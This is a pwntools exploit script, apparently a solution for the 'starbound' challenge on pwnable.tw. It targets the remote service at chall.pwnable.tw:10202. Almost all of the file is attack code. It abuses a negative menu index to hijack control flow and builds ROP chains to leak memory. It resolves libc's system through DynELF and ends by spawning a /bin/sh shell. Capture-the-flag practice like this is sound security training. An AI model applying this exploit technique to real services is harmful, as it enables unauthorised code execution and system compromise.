#coding=utf8
from pwn import *
#context.log_level = 'debug'
#context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./starbound')
	bin = ELF('./starbound')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10202)
	bin = ELF('./starbound')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def run_rop(rop_code):
	#assert waiting in menu
	cn.recvuntil('> ')
	pay = '-33'
	pay = pay.ljust(8,'a')
	pay += rop_code
	cn.send(pay)
	global stack_buf
	stack_buf-=0xf0

def set_name(s):
	#assert waiting in main menu
	cn.recvuntil('> ')
	cn.sendline('6')
	cn.recvuntil('> ')
	cn.sendline('2')
	cn.recvuntil(': ')
	cn.sendline(s)
	cn.recvuntil('> ')
	cn.sendline('1')

def leak(addr):
	set_name(p32(add_esp_1c))
	pay = p32(bin.plt['write']) + p32(p3ret) + p32(1) + p32(addr) + p32(0x80)
	pay+=p32(bin.sym['main'])
	run_rop(pay)
	d = cn.recv(0x80)
	return d

add_esp_1c = 0x08048e48 # add esp, 0x1c ; ret
p3ret = 0x080494da


set_name(p32(bin.plt['puts']))
cn.recvuntil('> ')

cn.send('-33a')
cn.recvuntil('-33a')
stack_buf = u32(cn.recv(4))-0xb0
success('stack_buf: '+hex(stack_buf))

d = DynELF(leak,elf=bin,libcdb=False)
system = d.lookup('system','libc')
success('system: ' +hex(system))


set_name(p32(add_esp_1c))
pay = p32(bin.plt['read']) + p32(p3ret) + p32(0) + p32(0x8058800) + p32(0x10)
pay += p32(system) + 'bbbb' + p32(0x8058800)
run_rop(pay)

cn.send('/bin/sh\x00')

cn.interactive()
